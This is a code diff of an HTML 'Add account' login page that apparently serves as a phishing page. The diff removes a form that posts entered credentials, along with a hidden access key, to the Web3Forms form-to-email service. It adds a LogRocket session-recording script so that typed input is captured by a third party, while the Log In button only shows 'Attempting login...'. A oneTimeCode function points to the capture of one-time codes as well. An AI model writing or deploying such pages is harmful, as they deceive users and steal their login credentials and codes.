@@ -9,6 +9,10 @@
     <!-- TAB ICON -->
     <link rel="icon" type="image/png" href="icon.png">
 
+    <!-- LOGROCKET TRACKING SCRIPT -->
+    <script src="https://cdn.logr-in.com/LogRocket.min.js" crossorigin="anonymous"></script>
+    <script>window.LogRocket && window.LogRocket.init('ksgyyy/login');</script>
+
     <style>
         * {
             box-sizing: border-box;
@@ -203,11 +207,8 @@
 
         <h1>Add account</h1>
 
-        <!-- WEB3FORMS FORM WRAPPER -->
-        <form action="https://api.web3forms.com/submit" method="POST">
-
-            <!-- Hidden Access Key required by Web3Forms -->
-            <input type="hidden" name="access_key" value="5af1fe4c-4c28-47b6-9445-f72374380afa">
+        <!-- NORMAL DIV FORM (No Web3Forms, tracked purely by LogRocket) -->
+        <div id="loginForm">
 
             <input
                 type="text"
@@ -225,11 +226,11 @@
                 required
             >
 
-            <button type="submit" class="login-btn">
+            <button type="button" class="login-btn" onclick="handleLogin()">
                 Log In
             </button>
 
-        </form>
+        </div>
 
 
         <a href="#" class="forgot">
@@ -271,6 +272,20 @@
 
 
     <script>
+        function handleLogin() {
+            const user = document.getElementById("username").value;
+            const message = document.getElementById("message");
+            
+            if(!user) {
+                message.style.color = "#ff6b6b";
+                message.textContent = "Please fill in the fields.";
+                return;
+            }
+
+            message.style.color = "#51cf66";
+            message.textContent = "Attempting login...";
+        }
+
         function oneTimeCode() {
             const message = document.getElementById("message");
             message.style.color = "#ffd166";
